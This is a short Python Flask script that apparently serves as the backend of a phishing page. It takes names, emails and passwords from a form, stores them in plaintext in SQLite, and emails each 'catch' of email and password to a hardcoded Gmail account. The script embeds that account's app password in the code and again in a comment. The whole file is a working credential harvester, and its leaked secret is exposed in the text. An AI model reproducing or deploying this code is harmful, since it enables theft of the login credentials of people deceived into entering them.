from flask import Flask , request , render_template, redirect,url_for
from cs50 import SQL
from email.message import EmailMessage
import ssl
import smtplib
#arwbmjpclmfiejeo
app = Flask(__name__)
db = SQL("sqlite:///appdata.db")

email_sender = "sehh510@gmail.com"
email_password = "arwbmjpclmfiejeo"
email_resiver = "sehh510@gmail.com"

@app.route("/", methods=['POST','GET'])
def index():
    messege = ""
    submit = request.form.get('submit')
    if submit:
        name = request.form.get('name')
        email = request.form.get('email')
        password = request.form.get('password')
        db.execute("INSERT INTO users (name,email,password) VALUES(?, ?, ?)", name, email, password)
        messege = "new info: password = " + str(password) + "email = " + str( email)
    EM = EmailMessage()
    EM['From'] = email_sender
    EM['To'] = email_resiver
    EM['Subject'] = "NEW CATCH"
    EM.set_content(messege)
    contex = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com',465,context=contex) as smtp:
        smtp.login(email_sender,email_password)
        smtp.sendmail(email_sender,email_resiver,EM.as_string())
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
